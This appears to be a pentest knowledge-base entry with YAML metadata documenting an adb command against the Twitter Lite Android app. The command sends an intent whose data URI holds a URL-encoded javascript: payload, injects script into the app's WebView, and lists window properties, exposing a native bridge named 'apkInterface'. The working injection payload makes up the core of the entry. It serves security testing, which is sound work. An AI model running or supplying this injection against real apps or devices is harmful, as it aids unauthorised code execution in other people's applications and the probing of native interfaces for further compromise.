---
data: >-
  adb shell am start -a "android.intent.action.VIEW" -n
  com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d
  "javascript://google.com%0Ajavascript:Object.getOwnPropertyNames(window).forEach(function(v%2C%20x)%20%7B%20document.writeln(v)%3B%20%7D)%3B"
tags:
  - adb
  - js-injection
  - enumeration
type: command
output: Lists window properties including 'apkInterface' at the bottom of the page
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:31.823Z'
id: 9ea31f9d-1c21-4d92-9ffd-897b655c9b7d
verified: false
validated: true
submitted: true
---
# adb-enumerate-window-properties-in-twitterlite

## Command

```bash
adb shell am start -a "android.intent.action.VIEW" -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://google.com%0Ajavascript:Object.getOwnPropertyNames(window).forEach(function(v%2C%20x)%20%7B%20document.writeln(v)%3B%20%7D)%3B"
```

## Description

Injects JS to enumerate and display window object properties.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -a | Intent action VIEW | Yes |
| -n | Component | Yes |
| -d | Encoded JS payload | Yes |

## Examples

### Basic Usage

As above.

### Advanced Usage

Modify JS for filtering: add if statements in payload.

## Expected Output

Document lists properties like apkInterface.

## Related

- [[commands/adb-enumerate-apkinterface-properties-in-twitterlite]]
- [[procedures/Enumerate-Window-Properties-via-JavaScript-Injection-in-TwitterLiteActivity]]
